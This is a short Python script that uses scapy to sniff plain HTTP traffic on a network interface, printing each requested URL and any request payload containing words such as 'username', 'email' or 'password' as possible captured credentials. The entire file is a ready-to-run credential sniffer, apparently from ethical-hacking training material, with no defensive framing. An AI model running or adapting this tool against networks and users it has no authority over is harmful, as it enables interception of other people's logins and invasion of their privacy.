#!/usr/bin/env python
try:
    import scapy.all as scapy
except ImportError:
    import scapy

try:
    # This import works from the project directory
    import scapy_http.http as http
except ImportError:
    # If you installed this package via pip, you just need to execute this
    from scapy.layers import http as http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
# end sniff


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
# end get_url


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "email", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load
# end get_login_info


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")
# end process_sniffed_packet


sniff("eth0")
